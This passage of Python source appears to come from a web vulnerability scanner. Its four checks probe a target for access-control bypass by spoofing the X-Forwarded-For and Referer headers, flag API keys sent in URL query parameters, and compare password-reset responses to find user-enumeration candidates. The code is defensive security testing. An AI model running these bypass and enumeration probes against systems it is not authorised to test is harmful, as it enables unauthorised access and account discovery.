# ---------------------------------------------------------------------
# 139. Access-control bypass via spoofed X-Forwarded-For
# ---------------------------------------------------------------------
_TRUSTED_LOOKING_IPS = ["127.0.0.1", "10.0.0.1", "192.168.1.1", "::1"]


async def check_ip_restriction_bypass_via_xff(url: str) -> dict | None:
    """
    Third distinct bypass-header technique alongside check_auth_bypass_
    via_method_override (batch 11) and check_auth_bypass_via_verb_
    tampering (batch 13), this time for IP-based access restrictions
    specifically: some apps/proxies trust X-Forwarded-For blindly for
    "internal only" or "localhost only" checks. Same deterministic
    status-code-transition proof - a clean 401/403 baseline, then a
    real 200 with substantial content after spoofing a trusted-looking
    source IP.
    """
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=False) as client:
            try:
                baseline_resp = await client.get(url)
            except httpx.HTTPError:
                return None
            if baseline_resp.status_code not in (401, 403):
                return None

            for fake_ip in _TRUSTED_LOOKING_IPS:
                try:
                    resp = await client.get(url, headers={"X-Forwarded-For": fake_ip})
                except httpx.HTTPError:
                    continue
                if resp.status_code == 200 and len(resp.text) >= _MIN_BYPASS_BODY_LENGTH:
                    return {
                        "vuln_type": "ip_restriction_bypass_via_xff",
                        "severity": "high",
                        "evidence": (
                            f"{url}: plain request returned {baseline_resp.status_code} "
                            f"(blocked), but X-Forwarded-For: {fake_ip} returned 200 with a "
                            f"{len(resp.text)}-byte body - an IP-based access restriction is "
                            f"trusting a client-supplied header instead of the real "
                            f"connection source."
                        ),
                    }
    except httpx.HTTPError as exc:
        logger.info("detective: XFF IP restriction bypass check failed for %s: %s", url, exc)
    return None


# ---------------------------------------------------------------------
# 140. Access-control bypass via spoofed/omitted Referer
# ---------------------------------------------------------------------
async def check_referer_based_access_control_bypass(url: str) -> dict | None:
    """
    Fourth bypass-header variant: some apps use Referer presence/value
    as a weak access-control signal (e.g., only allow a page if it was
    reached by clicking through from another internal page). Tests
    whether supplying a same-origin-looking Referer bypasses a block
    that occurs with no Referer at all. Same deterministic status-code
    proof bar as the other three bypass checks.
    """
    domain = httpx.URL(url).host
    if not domain:
        return None
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=False) as client:
            try:
                baseline_resp = await client.get(url, headers={"Referer": ""})
            except httpx.HTTPError:
                return None
            if baseline_resp.status_code not in (401, 403):
                return None

            try:
                resp = await client.get(url, headers={"Referer": f"https://{domain}/"})
            except httpx.HTTPError:
                return None
            if resp.status_code == 200 and len(resp.text) >= _MIN_BYPASS_BODY_LENGTH:
                return {
                    "vuln_type": "referer_based_access_control_bypass",
                    "severity": "medium",
                    "evidence": (
                        f"{url}: request with no Referer returned {baseline_resp.status_code} "
                        f"(blocked), but adding Referer: https://{domain}/ (trivially "
                        f"spoofable) returned 200 with a {len(resp.text)}-byte body - access "
                        f"control is keyed off a client-controlled header."
                    ),
                }
    except httpx.HTTPError as exc:
        logger.info("detective: Referer-based access control bypass check failed for %s: %s", url, exc)
    return None


# ---------------------------------------------------------------------
# 141. API key/token transmitted as a URL query parameter (recon-only)
# ---------------------------------------------------------------------
_URL_APIKEY_PARAM_RE = re.compile(r"^(api[_-]?key|apikey|access[_-]?token|auth[_-]?token|client[_-]?secret)$", re.IGNORECASE)


async def check_api_key_in_url_query_param(url: str) -> str | None:
    """
    Flags an API key/token-shaped parameter name carried in the URL
    query string. Returns a plain string, NOT a findings dict - distinct
    from check_api_key_leak_signature (batch 8, which matches specific
    key FORMATS anywhere in a response body): this flags the
    TRANSMISSION PATTERN itself (any key-shaped param name in a URL,
    regardless of its format), which risks leaking via browser history,
    server access logs, and the Referer header on any outbound link.
    """
    parsed = httpx.URL(url)
    for param_name in parsed.params:
        if _URL_APIKEY_PARAM_RE.match(param_name):
            return (
                f"{url}: parameter '{param_name}' (API key/token-shaped name) is carried in "
                f"the URL query string - risks leaking via browser history, server access "
                f"logs, and the Referer header on any outbound link from this page"
            )
    return None


# ---------------------------------------------------------------------
# 142. Password-reset endpoint user-enumeration candidate (recon-only)
# ---------------------------------------------------------------------
async def check_password_reset_user_enumeration_candidate(url: str) -> str | None:
    """
    Submits two different-looking email addresses to a forgot-password-
    shaped endpoint and compares response length/status. Returns a
    plain string, NOT a findings dict - a length/status difference is a
    real user-enumeration candidate, but this scanner has no ground
    truth for which (if either) email actually exists on the target, so
    it can't confirm the difference actually correlates with account
    existence rather than unrelated input-validation branching (e.g.
    one address failing a format check the other passes).
    """
    path_lower = str(httpx.URL(url).path).lower()
    if not any(kw in path_lower for kw in ("forgot", "reset-password", "password-reset", "forgot-password")):
        return None

    probe_email_a = f"swas-probe-{uuid.uuid4().hex[:8]}@swas-nonexistent-domain.test"
    probe_email_b = "admin@swas-nonexistent-domain.test"

    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            try:
                resp_a = await client.post(url, json={"email": probe_email_a})
                resp_b = await client.post(url, json={"email": probe_email_b})
            except httpx.HTTPError:
                return None
    except httpx.HTTPError as exc:
        logger.info("detective: password reset enumeration check failed for %s: %s", url, exc)
        return None

    if resp_a.status_code != resp_b.status_code or abs(len(resp_a.text) - len(resp_b.text)) > 10:
        return (
            f"{url}: submitting two different email addresses produced different responses "
            f"(status {resp_a.status_code} vs {resp_b.status_code}, length "
            f"{len(resp_a.text)} vs {len(resp_b.text)}) - candidate for user-enumeration "
            f"testing; this scanner has no ground truth for which email actually exists, so "
            f"the difference could also be unrelated input-validation branching"
        )
    return None
